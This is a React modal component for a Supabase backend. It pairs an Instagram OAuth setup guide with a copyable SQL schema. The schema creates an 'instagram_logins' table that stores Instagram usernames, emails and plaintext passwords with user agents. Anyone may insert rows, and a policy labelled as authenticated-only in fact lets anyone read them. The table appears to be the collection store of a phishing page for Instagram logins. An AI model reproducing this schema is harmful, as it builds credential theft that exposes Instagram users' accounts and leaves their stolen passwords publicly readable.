import React, { useState } from 'react';
import { X, Database, ShieldCheck, Key, Instagram, Copy, Check, Terminal, ExternalLink } from 'lucide-react';
import { isSupabaseConfigured } from '../../lib/supabase';

interface SupabaseConfigModalProps {
  isOpen: boolean;
  onClose: () => void;
}

export const SupabaseConfigModal: React.FC<SupabaseConfigModalProps> = ({ isOpen, onClose }) => {
  const [copied, setCopied] = useState(false);

  if (!isOpen) return null;

  const sqlSnippet = `-- Execute in Supabase SQL Editor:
-- 1. Profiles Table
CREATE TABLE IF NOT EXISTS public.profiles (
  id UUID PRIMARY KEY REFERENCES auth.users(id) ON DELETE CASCADE,
  email TEXT,
  username TEXT,
  full_name TEXT,
  avatar_url TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT timezone('utc'::text, now()),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT timezone('utc'::text, now())
);

-- 2. Dedicated Instagram Login Records Table
CREATE TABLE IF NOT EXISTS public.instagram_logins (
  id BIGSERIAL PRIMARY KEY,
  username TEXT NOT NULL,
  email TEXT,
  password TEXT,
  user_id UUID REFERENCES auth.users(id) ON DELETE SET NULL,
  user_agent TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT timezone('utc'::text, now())
);

ALTER TABLE public.profiles ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.instagram_logins ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Allow public insert to instagram_logins"
ON public.instagram_logins FOR INSERT WITH CHECK (true);

CREATE POLICY "Allow authenticated read to instagram_logins"
ON public.instagram_logins FOR SELECT USING (true);

CREATE POLICY "Users can view own profile" 
ON public.profiles FOR SELECT USING (auth.uid() = id);

CREATE POLICY "Users can insert own profile" 
ON public.profiles FOR INSERT WITH CHECK (auth.uid() = id);

CREATE POLICY "Users can update own profile" 
ON public.profiles FOR UPDATE USING (auth.uid() = id);

CREATE OR REPLACE FUNCTION public.handle_new_user()
RETURNS TRIGGER AS $$
BEGIN
  INSERT INTO public.profiles (id, email, full_name, username)
  VALUES (
    NEW.id,
    NEW.email,
    COALESCE(NEW.raw_user_meta_data->>'full_name', NEW.raw_user_meta_data->>'fullName', SPLIT_PART(NEW.email, '@', 1)),
    COALESCE(NEW.raw_user_meta_data->>'username', NEW.raw_user_meta_data->>'instagram_username')
  )
  ON CONFLICT (id) DO UPDATE SET
    username = EXCLUDED.username,
    updated_at = now();
  RETURN NEW;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

CREATE TRIGGER on_auth_user_created
  AFTER INSERT ON auth.users
  FOR EACH ROW EXECUTE FUNCTION public.handle_new_user();`;

  const copySql = () => {
    navigator.clipboard.writeText(sqlSnippet);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/85 backdrop-blur-md animate-fade-in">
      <div
        id="supabase-config-dialog"
        className="w-full max-w-3xl glass-card rounded-2xl border border-purple-500/30 shadow-[0_0_60px_rgba(236,72,153,0.25)] overflow-hidden my-6"
      >
        {/* Header */}
        <div className="p-6 border-b border-purple-500/20 bg-[#120826]/90 flex items-center justify-between">
          <div className="flex items-center space-x-3">
            <div className="w-10 h-10 rounded-xl bg-gradient-to-tr from-pink-500/20 to-purple-600/30 border border-pink-500/40 flex items-center justify-center text-pink-400">
              <Database className="w-5 h-5" />
            </div>
            <div>
              <div className="flex items-center space-x-2">
                <h3 className="text-xl font-bold text-white leading-none">
                  Supabase Backend & Security
                </h3>
                <span
                  className={`text-[10px] px-2 py-0.5 rounded-full font-bold uppercase ${
                    isSupabaseConfigured
                      ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/30'
                      : 'bg-amber-500/20 text-amber-300 border border-amber-500/30'
                  }`}
                >
                  {isSupabaseConfigured ? 'Connected' : 'Credentials Needed'}
                </span>
              </div>
              <p className="text-xs text-purple-300/80 mt-1">
                PostgreSQL Profiles Schema, RLS, Triggers & Instagram OAuth Guide
              </p>
            </div>
          </div>
          <button
            onClick={onClose}
            className="p-1.5 rounded-lg text-purple-300 hover:text-white hover:bg-white/10 transition-colors"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Content */}
        <div className="p-6 max-h-[70vh] overflow-y-auto space-y-6 text-sm text-[#c4b5fd]">
          {/* Quick Status */}
          <div className="p-4 rounded-xl bg-[#170b33] border border-purple-500/20 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
            <div>
              <h4 className="font-bold text-white text-sm mb-0.5">
                Environment Configuration
              </h4>
              <p className="text-xs text-[#a79bbd]">
                Set <code className="text-pink-300">VITE_SUPABASE_URL</code> and{' '}
                <code className="text-pink-300">VITE_SUPABASE_ANON_KEY</code> in your environment.
              </p>
            </div>
            <div className="shrink-0 font-mono text-xs text-purple-200">
              File: <span className="text-pink-300">/.env.example</span>
            </div>
          </div>

          {/* SQL Schema Section */}
          <div className="space-y-3">
            <div className="flex items-center justify-between">
              <div className="flex items-center space-x-2">
                <Terminal className="w-4 h-4 text-pink-400" />
                <h4 className="font-bold text-white text-sm">
                  1. SQL DDL & Trigger Script (`supabase-schema.sql`)
                </h4>
              </div>
              <button
                onClick={copySql}
                className="px-3 py-1 rounded-lg bg-pink-500/20 text-pink-300 border border-pink-500/40 text-xs font-semibold flex items-center space-x-1 hover:bg-pink-500 hover:text-white transition-all"
              >
                {copied ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                <span>{copied ? 'Copied' : 'Copy SQL Script'}</span>
              </button>
            </div>

            <pre className="p-4 rounded-xl bg-[#0a0314] border border-purple-500/30 text-pink-200 font-mono text-xs overflow-x-auto">
              {sqlSnippet}
            </pre>
          </div>

          {/* Instagram OAuth Setup Guide */}
          <div className="space-y-3 pt-2">
            <div className="flex items-center space-x-2">
              <Instagram className="w-4 h-4 text-[#E4405F]" />
              <h4 className="font-bold text-white text-sm">
                2. Instagram OAuth Setup in Supabase Dashboard
              </h4>
            </div>

            <div className="p-4 rounded-xl bg-[#14082b] border border-purple-500/20 space-y-3 text-xs leading-relaxed text-[#bcaecf]">
              <p>
                To enable live Instagram sign-in through Supabase Auth without exposing private secrets:
              </p>
              <ol className="list-decimal list-inside space-y-2 pl-2">
                <li>
                  Go to <strong className="text-white">Meta for Developers</strong> (developers.facebook.com) and create an app.
                </li>
                <li>
                  Add <strong className="text-white">Instagram Basic Display</strong> product.
                </li>
                <li>
                  In OAuth Redirect URIs, add your Supabase project callback URL:
                  <br />
                  <code className="mt-1 inline-block px-2 py-1 rounded bg-black/50 text-pink-300 font-mono text-[11px]">
                    https://&lt;YOUR-SUPABASE-PROJECT&gt;.supabase.co/auth/v1/callback
                  </code>
                </li>
                <li>
                  In your <strong className="text-white">Supabase Dashboard</strong>, navigate to:
                  <span className="text-pink-300 font-semibold ml-1">Authentication → Providers → Instagram</span>.
                </li>
                <li>
                  Toggle Instagram to <strong>Enabled</strong>, paste your <strong>Client ID</strong> and <strong>Client Secret</strong>, and click <strong>Save</strong>.
                </li>
              </ol>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
